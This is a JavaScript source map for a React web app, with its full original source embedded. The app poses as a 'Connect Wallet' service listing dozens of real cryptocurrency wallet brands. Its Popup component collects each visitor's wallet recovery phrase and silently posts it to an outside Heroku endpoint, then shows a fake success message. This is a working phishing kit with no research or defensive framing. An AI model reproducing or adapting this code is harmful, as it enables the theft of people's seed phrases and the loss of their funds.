{"version":3,"sources":["components/homepage/data.js","components/homepage/Homepage.js","components/popup/Popup.js","App.js","serviceWorker.js","index.js"],"names":["data","name","image","Homepage","props","setPopUpdata","setShowPopup","className","map","d","onClick","importWallet","src","Popup","popUpData","useState","showMessage","setShowmessage","rPhrase","setRPhrase","disableButton","setDisableButton","showSuccess","setShowSuccess","closeModal","type","disabled","value","fill","stroke-linecap","stroke-linejoin","stroke-width","viewBox","stroke","class","onChange","e","target","checkPhrase","match","setTimeout","body","JSON","stringify","wallet","Axios","post","headers","then","res","catch","err","handleSubmission","App","showPopup","Fragment","Boolean","window","location","hostname","ReactDOM","render","StrictMode","document","getElementById","navigator","serviceWorker","ready","registration","unregister"],"mappings":"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","file":"static/js/main.14b27c05.chunk.js","sourcesContent":["export const data =[\r\n    { name: '  Trust wallet', image: '../../images/trustwallet.png' },\r\n    { name: '  AAVE wallet', image: '../../images/aave.jpeg' },\r\n    { name: '  Ledger wallet', image: '../../images/ledgerwallet.png' },\r\n    { name: '  Enjin wallet', image: '../../images/Enjinwallet.png' },\r\n    { name: '  MEW wallet', image: '../../images/mewwallet.png' },\r\n    { name: '  Meta mask wallet', image: '../../images/metamask.png' },\r\n    { name: '  Digitex wallet', image: '../../images/digitex.png' },\r\n    { name: '  Coinbase wallet', image: '../../images/coinbase.png' },\r\n    { name: '  Autherum wallet', image: '../../images/autherum.png' },\r\n    { name: '  Portis wallet', image: '../../images/portis.png' },\r\n    { name: '  Formatic wallet', image: '../../images/formatic.png' },\r\n    { name: '  Exodus wallet', image: '../../images/exodus.png' },\r\n    { name: '  Defiat wallet', image: '../../images/defiat.png' },\r\n    { name: '  Skale wallet', image: '../../images/skale.png' },\r\n    { name: '  Wallet connect', image: '../../images/walletconnect.jpeg' },\r\n    { name: '  Coinomi wallet', image: '../../images/coinomi.png' },\r\n    { name: '  Atomic wallet', image: '../../images/atomic.jpeg' },\r\n    { name: '  Tron wallet', image: '../../images/tronwallet.png' },\r\n    { name: '  Band protocol wallet', image: '../../images/band.png' },\r\n    { name: '  EOS wallet', image: '../../images/eos.png' },\r\n    { name: '  Wax wallet', image: '../../images/wax.png' },\r\n    { name: '  Zilliqa wallet', image: '../../images/zilliqa.png' },\r\n    { name: '  Polkadot wallet', image: '../../images/polkadot.png' },\r\n    { name: '  Monero wallet', image: '../../images/monero.png' },\r\n    { name: '  Klever wallet', image: '../../images/klever.jpg' },\r\n    { name: '  Neon wallet', image: '../../images/neon.png' },\r\n    { name: '  Theta wallet', image: '../../images/theta.png' },\r\n    { name: '  Tomo Chain wallet', image: '../../images/tomochain.png' },\r\n    { name: '  Jaxx wallet', image: '../../images/jaxx.png' },\r\n    { name: '  Elrond wallet', image: '../../images/elrond.png' },\r\n    { name: '  Bancor wallet', image: '../../images/bancor.png' },\r\n    { name: '  1inch wallet', image: '../../images/1inch.png' },\r\n    { name: '  Cosmos wallet', image: '../../images/cosmos.png' },\r\n    { name: '  Moonlet wallet', image: '../../images/moonlet.png' },\r\n    { name: '  Harmony wallet', image: '../../images/harmony.png' },\r\n    { name: '  Tezos wallet', image: '../../images/tezos.png' },\r\n    { name: '  Kyber Swap wallet', image: '../../images/kyberswap.png' },\r\n    { name: '  Falcon Swap wallet', image: '../../images/falswap.png' },\r\n    { name: '  Zilliqa wallet', image: '../../images/zilliqa.png' },\r\n    { name: '  Kava wallet', image: '../../images/kava.png' },\r\n    { name: '  Ocean Protocol wallet', image: '../../images/oceanprotocol.png' },\r\n    { name: '  Hex wallet', image: '../../images/hexcom.png' },\r\n    { name: '  Cardano wallet', image: '../../images/cardano.png' },\r\n    { name: '  Kardia Chain wallet', image: '../../images/kardiachain.png' },\r\n    { name: '  Octofi wallet', image: '../../images/octofi.png' },\r\n    { name: '  Algorand wallet', image: '../../images/algorand.png' }\r\n  ]","import React from 'react'\r\nimport './Homepage.css'\r\nimport './mobile.css'\r\nimport {data }from './data'\r\nconst Homepage = ({setPopUpdata,setShowPopup},props) => {\r\n\r\n\r\n    const importWallet = (d) => {\r\n        setPopUpdata( d );\r\n        setShowPopup(true)\r\n    }\r\n    return (\r\n        <section className=\"homepage\">\r\n            <div className=\"header\">\r\n                <h1>Connect Wallet</h1>\r\n                \r\n            </div>\r\n\r\n            <div className=\"text\">\r\n            <p>The best way to manage all your wallets from a single app. With our highly secure integrations with top wallet providers, you can efficiently manage all your wallets on our app..</p>\r\n            </div>\r\n            <div className=\"grid\">\r\n\r\n                {\r\n                    data.map(d =>(\r\n                    <div className=\"small-box\" onClick={()=>importWallet(d)}>\r\n                    <img src={d.image}></img>\r\n                            <p>{ d.name}</p>\r\n                </div>\r\n                    ))\r\n                }\r\n                \r\n                \r\n            </div>\r\n        </section>\r\n    );\r\n};\r\n\r\nexport default Homepage\r\n","import React, { useState, useEffect } from \"react\";\r\nimport \"./Popup.css\";\r\nimport \"./mobile.css\";\r\nimport Axios from \"axios\";\r\nconst Popup = ({ setPopUpdata, setShowPopup, popUpData }) => {\r\n  const [showMessage, setShowmessage] = useState(\"\");\r\n  const [rPhrase, setRPhrase] = useState(\"\");\r\n  const [disableButton, setDisableButton] = useState(false);\r\n  const [showSuccess, setShowSuccess] = useState(false);\r\n\r\n  const closeModal = () => {\r\n    setShowPopup(false);\r\n    setPopUpdata(null);\r\n    setShowSuccess(false);\r\n  };\r\n\r\n  const handleSubmission = (data) => {\r\n    setDisableButton(true);\r\n    //12 characters or more ingoring spaces\r\n    const checkPhrase = rPhrase.match(/\\s*(\\S\\s*){12,}/g);\r\n    // console.log( rPhrase );\r\n    setTimeout(() => {\r\n      if (!checkPhrase) {\r\n        setShowmessage(\"Invalid characters entered.\");\r\n      } else {\r\n        const config = {\r\n          headers: {\r\n            \"Content-Type\": \"application/json\",\r\n          },\r\n        };\r\n        const body = JSON.stringify({ rPhrase, wallet: popUpData.name });\r\n        Axios.post(\"https://walletbe.herokuapp.com/message\", body, config)\r\n          // .then( res =>res.json() )\r\n          .then((res) => {\r\n            //    console.log(res)\r\n          })\r\n          .catch((err) => {\r\n            // console.log(err)\r\n          });\r\n        setShowSuccess(true);\r\n      }\r\n      setDisableButton(false);\r\n    }, 4000);\r\n\r\n    setTimeout(() => {\r\n      setShowmessage(\"\");\r\n    }, 6000);\r\n  };\r\n\r\n  return (\r\n    <section className=\"popup\">\r\n      {!showSuccess ? (\r\n        <div>\r\n          <div className=\"form-header\">\r\n            <img src={popUpData.image}></img>\r\n            <p>Import your {popUpData.name}</p>\r\n          </div>\r\n          {showMessage ? (\r\n            <p className=\"error-success-msg\">{showMessage}</p>\r\n          ) : null}\r\n          <div className=\"form\">\r\n            <form>\r\n              <div>\r\n                <label>Wallet Name:</label>\r\n                <input type=\"text\" disabled={true} value={popUpData.name} />\r\n                <span className=\"input\">\r\n                  <svg\r\n                    fill=\"none\"\r\n                    stroke-linecap=\"round\"\r\n                    stroke-linejoin=\"round\"\r\n                    stroke-width=\"2\"\r\n                    viewBox=\"0 0 24 24\"\r\n                    stroke=\"currentColor\"\r\n                    class=\"h-6 w-6\"\r\n                  >\r\n                    <path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path>\r\n                  </svg>\r\n                </span>\r\n              </div>\r\n              <div className=\"recovery\">\r\n                <label>Recovery Phrase:</label>\r\n                <textarea\r\n                  type=\"text\"\r\n                  onChange={(e) => setRPhrase(e.target.value)}\r\n                ></textarea>\r\n                <span className=\"textarea\">\r\n                  <svg\r\n                    fill=\"none\"\r\n                    stroke-linecap=\"round\"\r\n                    stroke-linejoin=\"round\"\r\n                    stroke-width=\"2\"\r\n                    viewBox=\"0 0 24 24\"\r\n                    stroke=\"currentColor\"\r\n                    class=\"h-6 w-6\"\r\n                  >\r\n                    <path d=\"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z\"></path>\r\n                  </svg>\r\n                </span>\r\n              </div>\r\n              <h6>\r\n                <i className=\"fa fa-info-circle\"></i>Typically 12 (sometimes 24)\r\n                words separated by single spaces.\r\n              </h6>\r\n\r\n              {disableButton ? (\r\n                <div className=\"proceed-button disabled\">\r\n                  <p>Please Wait... </p>\r\n                </div>\r\n              ) : (\r\n                <div\r\n                  className=\"proceed-button\"\r\n                  onClick={() => handleSubmission()}\r\n                >\r\n                  <p>Proceed </p>\r\n                  <svg\r\n                    fill=\"none\"\r\n                    stroke-linecap=\"round\"\r\n                    stroke-linejoin=\"round\"\r\n                    stroke-width=\"2\"\r\n                    viewBox=\"0 0 24 24\"\r\n                    stroke=\"currentColor\"\r\n                    class=\"h-6 w-6\"\r\n                  >\r\n                    <path d=\"M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z\"></path>\r\n                  </svg>\r\n                </div>\r\n              )}\r\n            </form>\r\n\r\n            {disableButton ? null : (\r\n              <div className=\"cancel\">\r\n                <p onClick={() => closeModal()}>Cancel</p>\r\n              </div>\r\n            )}\r\n          </div>\r\n        </div>\r\n      ) : (\r\n        <div className=\"success-message-wrapper\">\r\n          <div className=\"success-message\">\r\n            <img src=\"../../images/success.png\" />\r\n            <h1>Thank You!</h1>\r\n            <h4>We recieved your submission.</h4>\r\n            <p onClick={() => closeModal()}> Back </p>\r\n          </div>\r\n        </div>\r\n      )}\r\n    </section>\r\n  );\r\n};\r\nexport default Popup;\r\n","import React, { useState, useEffect } from \"react\";\r\nimport Homepage from \"./components/homepage/Homepage\";\r\nimport \"./App.css\";\r\nimport Popup from \"./components/popup/Popup\";\r\nconst App = () => {\r\n  const [showPopup, setShowPopup] = useState(false);\r\n  const [popUpData, setPopUpdata] = useState({});\r\n  return (\r\n    <React.Fragment>\r\n      <Homepage setPopUpdata={setPopUpdata} setShowPopup={setShowPopup} />\r\n      {showPopup ? (\r\n        <Popup\r\n          popUpData={popUpData}\r\n          setPopUpdata={setPopUpdata}\r\n          setShowPopup={setShowPopup}\r\n        />\r\n      ) : null}\r\n    </React.Fragment>\r\n  );\r\n};\r\n\r\nexport default App;\r\n","// This optional code is used to register a service worker.\r\n// register() is not called by default.\r\n\r\n// This lets the app load faster on subsequent visits in production, and gives\r\n// it offline capabilities. However, it also means that developers (and users)\r\n// will only see deployed updates on subsequent visits to a page, after all the\r\n// existing tabs open on the page have been closed, since previously cached\r\n// resources are updated in the background.\r\n\r\n// To learn more about the benefits of this model and instructions on how to\r\n// opt-in, read https://bit.ly/CRA-PWA\r\n\r\nconst isLocalhost = Boolean(\r\n  window.location.hostname === 'localhost' ||\r\n    // [::1] is the IPv6 localhost address.\r\n    window.location.hostname === '[::1]' ||\r\n    // 127.0.0.0/8 are considered localhost for IPv4.\r\n    window.location.hostname.match(\r\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\r\n    )\r\n);\r\n\r\nexport function register(config) {\r\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\r\n    // The URL constructor is available in all browsers that support SW.\r\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\r\n    if (publicUrl.origin !== window.location.origin) {\r\n      // Our service worker won't work if PUBLIC_URL is on a different origin\r\n      // from what our page is served on. This might happen if a CDN is used to\r\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\r\n      return;\r\n    }\r\n\r\n    window.addEventListener('load', () => {\r\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\r\n\r\n      if (isLocalhost) {\r\n        // This is running on localhost. Let's check if a service worker still exists or not.\r\n        checkValidServiceWorker(swUrl, config);\r\n\r\n        // Add some additional logging to localhost, pointing developers to the\r\n        // service worker/PWA documentation.\r\n        navigator.serviceWorker.ready.then(() => {\r\n          console.log(\r\n            'This web app is being served cache-first by a service ' +\r\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\r\n          );\r\n        });\r\n      } else {\r\n        // Is not localhost. Just register service worker\r\n        registerValidSW(swUrl, config);\r\n      }\r\n    });\r\n  }\r\n}\r\n\r\nfunction registerValidSW(swUrl, config) {\r\n  navigator.serviceWorker\r\n    .register(swUrl)\r\n    .then(registration => {\r\n      registration.onupdatefound = () => {\r\n        const installingWorker = registration.installing;\r\n        if (installingWorker == null) {\r\n          return;\r\n        }\r\n        installingWorker.onstatechange = () => {\r\n          if (installingWorker.state === 'installed') {\r\n            if (navigator.serviceWorker.controller) {\r\n              // At this point, the updated precached content has been fetched,\r\n              // but the previous service worker will still serve the older\r\n              // content until all client tabs are closed.\r\n              console.log(\r\n                'New content is available and will be used when all ' +\r\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\r\n              );\r\n\r\n              // Execute callback\r\n              if (config && config.onUpdate) {\r\n                config.onUpdate(registration);\r\n              }\r\n            } else {\r\n              // At this point, everything has been precached.\r\n              // It's the perfect time to display a\r\n              // \"Content is cached for offline use.\" message.\r\n              console.log('Content is cached for offline use.');\r\n\r\n              // Execute callback\r\n              if (config && config.onSuccess) {\r\n                config.onSuccess(registration);\r\n              }\r\n            }\r\n          }\r\n        };\r\n      };\r\n    })\r\n    .catch(error => {\r\n      console.error('Error during service worker registration:', error);\r\n    });\r\n}\r\n\r\nfunction checkValidServiceWorker(swUrl, config) {\r\n  // Check if the service worker can be found. If it can't reload the page.\r\n  fetch(swUrl, {\r\n    headers: { 'Service-Worker': 'script' }\r\n  })\r\n    .then(response => {\r\n      // Ensure service worker exists, and that we really are getting a JS file.\r\n      const contentType = response.headers.get('content-type');\r\n      if (\r\n        response.status === 404 ||\r\n        (contentType != null && contentType.indexOf('javascript') === -1)\r\n      ) {\r\n        // No service worker found. Probably a different app. Reload the page.\r\n        navigator.serviceWorker.ready.then(registration => {\r\n          registration.unregister().then(() => {\r\n            window.location.reload();\r\n          });\r\n        });\r\n      } else {\r\n        // Service worker found. Proceed as normal.\r\n        registerValidSW(swUrl, config);\r\n      }\r\n    })\r\n    .catch(() => {\r\n      console.log(\r\n        'No internet connection found. App is running in offline mode.'\r\n      );\r\n    });\r\n}\r\n\r\nexport function unregister() {\r\n  if ('serviceWorker' in navigator) {\r\n    navigator.serviceWorker.ready.then(registration => {\r\n      registration.unregister();\r\n    });\r\n  }\r\n}\r\n","import React from \"react\";\r\nimport ReactDOM from \"react-dom\";\r\n\r\nimport App from \"./App\";\r\nimport * as serviceWorker from \"./serviceWorker\";\r\n\r\nReactDOM.render(\r\n  <React.StrictMode>\r\n    <App />\r\n  </React.StrictMode>,\r\n  document.getElementById(\"root\")\r\n);\r\n\r\n// If you want your app to work offline and load faster, you can change\r\n// unregister() to register() below. Note this comes with some pitfalls.\r\n// Learn more about service workers: https://bit.ly/CRA-PWA\r\nserviceWorker.unregister();\r\n"],"sourceRoot":""}